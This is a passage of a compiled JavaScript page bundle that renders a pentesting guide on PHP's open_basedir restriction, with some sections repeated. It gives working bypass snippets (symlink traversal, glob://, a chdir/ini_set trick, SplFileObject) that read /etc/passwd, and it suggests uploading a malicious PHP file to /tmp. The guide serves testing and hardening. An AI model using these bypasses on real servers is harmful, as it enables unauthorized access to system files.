allowed.)"]})}),"\n",(0,r.jsx)(s.h3,{id:"b-usingglobdirectory-browsing-1",children:(0,r.jsxs)(s.strong,{children:["B. Using\xa0",(0,r.jsx)(s.code,{children:"glob://"}),"\xa0(Directory Browsing)"]})}),"\n",(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0blocks\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"file_get_contents()"})}),", try:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$files = glob('/*');\r\nprint_r($files);  // Lists root dir files\r\n?>\n"})}),"\n",(0,r.jsx)(s.h3,{id:"c-usingchdirini_settrick-1",children:(0,r.jsxs)(s.strong,{children:["C. Using\xa0",(0,r.jsx)(s.code,{children:"chdir()"}),"\xa0+\xa0",(0,r.jsx)(s.code,{children:"ini_set()"}),"\xa0Trick"]})}),"\n",(0,r.jsx)(s.p,{children:"Some PHP versions allow:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nini_set('open_basedir', '..');\r\nchdir('..'); chdir('..'); chdir('..');\r\nini_set('open_basedir', '/');\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Depends on PHP version and\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"disable_functions"})}),".)"]})}),"\n",(0,r.jsx)(s.h3,{id:"d-usingsplfileobjectphp-53-1",children:(0,r.jsxs)(s.strong,{children:["D. Using\xa0",(0,r.jsx)(s.code,{children:"SplFileObject"}),"\xa0(PHP 5.3+)"]})}),"\n",(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"SplFileObject"})}),"\xa0is available:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$file = new SplFileObject('/etc/passwd');\r\necho $file->fread($file->getSize());\r\n?>\n"})}),"\n"]}),"\n"]})]}),(0,r.jsx)(s.h3,{id:"allow_url_include--allow_url_fopen",children:"allow_url_include & allow_url_fopen"}),(0,r.jsxs)(n,{children:[(0,r.jsx)(s.h2,{id:"1-checkingopen_basedirinphpinfo-1",children:(0,r.jsxs)(s.strong,{children:["1. Checking\xa0",(0,r.jsx)(s.code,{children:"open_basedir"}),"\xa0in\xa0",(0,r.jsx)(s.code,{children:"phpinfo()"})]})}),(0,r.jsxs)(s.p,{children:["Look for\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0in the PHP configuration section."]}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"empty"}),"\xa0\u2192 No restrictions (full filesystem access)."]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"set but incorrect"}),"\xa0\u2192 Possible bypasses."]}),"\n"]}),(0,r.jsxs)(s.p,{children:["Example from\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phpinfo()"})}),":"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"Directive           Local Value  Master Value\r\nopen_basedir       /var/www/html  /var/www/html\n"})}),(0,r.jsxs)(s.p,{children:["This means PHP scripts can\xa0",(0,r.jsx)(s.strong,{children:"only"}),"\xa0access files inside\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html"})}),"."]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h2,{id:"2-testing-for-misconfigurations-2",children:(0,r.jsx)(s.strong,{children:"2. Testing for Misconfigurations"})}),(0,r.jsx)(s.h3,{id:"a-using-php-to-check-access-2",children:(0,r.jsx)(s.strong,{children:"A. Using PHP to Check Access"})}),(0,r.jsx)(s.p,{children:"Try reading files outside the allowed path:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n// Attempt to read /etc/passwd\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If successful"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is\xa0",(0,r.jsx)(s.strong,{children:"not enforced"}),"\xa0or misconfigured."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If blocked"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is working (but may still be bypassable)."]}),"\n"]}),(0,r.jsx)(s.h3,{id:"b-common-misconfigurations-2",children:(0,r.jsx)(s.strong,{children:"B. Common Misconfigurations"})}),(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Multiple Paths Without Proper Separation"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Example:\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html:/tmp"})})]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/tmp"})}),"\xa0is writable, upload a malicious PHP file there and include it."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Missing Trailing Slash"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["May allow accessing\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html_secret"})}),"\xa0if it exists."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Good"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html/"})}),"\xa0(trailing slash restricts strictly)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Wildcard Misuse"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/*"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Might allow escaping via path traversal (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/../etc/passwd"})}),")."]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h2,{id:"3-bypassingopen_basedirif-misconfigured-2",children:(0,r.jsxs)(s.strong,{children:["3. Bypassing\xa0",(0,r.jsx)(s.code,{children:"open_basedir"}),"\xa0(If Misconfigured)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is set but weak, try these bypasses:"]}),(0,r.jsx)(s.h3,{id:"a-usingsymlinkrace-condition-2",children:(0,r.jsxs)(s.strong,{children:["A. Using\xa0",(0,r.jsx)(s.code,{children:"symlink()"}),"\xa0(Race Condition)"]})}),(0,r.jsx)(s.p,{children:"If you can create symlinks, you may escape:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nmkdir('traversed');\r\nchdir('traversed');\r\nsymlink('../../../../etc/passwd', 'link');\r\nchdir('..');\r\nsymlink('exploit/traversed/link', 'bypass');\r\necho file_get_contents('bypass');\r\n?>\n"})}),(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Works on some PHP versions when\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"symlink"})}),"\xa0is allowed.)"]})}),(0,r.jsx)(s.h3,{id:"b-usingglobdirectory-browsing-2",children:(0,r.jsxs)(s.strong,{children:["B. Using\xa0",(0,r.jsx)(s.code,{children:"glob://"}),"\xa0(Directory Browsing)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0blocks\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"file_get_contents()"})}),", try:"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$files = glob('/*');\r\nprint_r($files);  // Lists root dir files\r\n?>\n"})}),(0,r.jsx)(s.h3,{id:"c-usingchdirini_settrick-2",children:(0,r.jsxs)(s.strong,{children:["C. Using\xa0",(0,r.jsx)(s.code,{children:"chdir()"}),"\xa0+\xa0",(0,r.jsx)(s.code,{children:"ini_set()"}),"\xa0Trick"]})}),(0,r.jsx)(s.p,{children:"Some PHP versions allow:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nini_set('open_basedir', '..');\r\nchdir('..'); chdir('..'); chdir('..');\r\nini_set('open_basedir', '/');\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Depends on PHP version and\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"disable_functions"})}),".)"]})}),(0,r.jsx)(s.h3,{id:"d-usingsplfileobjectphp-53-2",children:(0,r.jsxs)(s.strong,{children:["D. Using\xa0",(0,r.jsx)(s.code,{children:"SplFileObject"}),"\xa0(PHP 5.3+)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"SplFileObject"})}),"\xa0is available:"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$file = new SplFileObject('/etc/passwd');\r\necho $file->fread($file->getSize());\r\n?>\n"})})]})]})]})}function a(e={}){const{wrapper:s}={...(0,l.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}}}]);